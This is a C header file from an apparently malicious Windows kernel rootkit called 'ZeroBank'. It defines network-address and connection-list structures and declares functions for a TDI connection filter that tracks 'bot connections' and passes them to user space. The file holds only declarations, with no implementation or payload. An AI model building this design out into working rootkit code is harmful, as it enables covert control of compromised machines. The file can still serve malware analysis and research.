#pragma once

typedef struct _ROOTKIT_NETWORK_ADDRESS
{
	UCHAR ip[4];
	UCHAR Port[2];

}ROOTKIT_NETWORK_ADDRESS, *PROOTKIT_NETWORK_ADDRESS;

typedef struct _ZEROBANK_FILTER_CONNECTION_REQUESTS
{
	LIST_ENTRY Entry;
	CHAR ShareData[255];
}ZEROBANK_FILTER_CONNECTION_REQUESTS, *PZEROBANK_FILTER_CONNECTION_REQUESTS;

typedef struct _ZEROBANK_FILTER_HEAD
{
	LIST_ENTRY Entry;
	ULONG NumberOfConnections;
}ZEROBANK_FILTER_HEAD, *PZEROBANK_FILTER_HEAD;


extern PZEROBANK_FILTER_HEAD g_filter_head;
PZEROBANK_FILTER_HEAD rk_get_number_of_bot_connections(IN PIO_STACK_LOCATION pStackLocation);
ULONG g_rk_copy_connections_to_buffer(IN PZEROBANK_FILTER_CONNECTION_REQUESTS pConnectionsRequest);


NTSTATUS g_rk_connect_start_filter(IN PZEROBANK_TDI_FILTER tdi);
BOOLEAN g_rk_send_connections_to_userspace(IN PFILE_OBJECT pSocket, IN PROOTKIT_API_HASH Hash);
NTSTATUS g_rk_connect_dispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
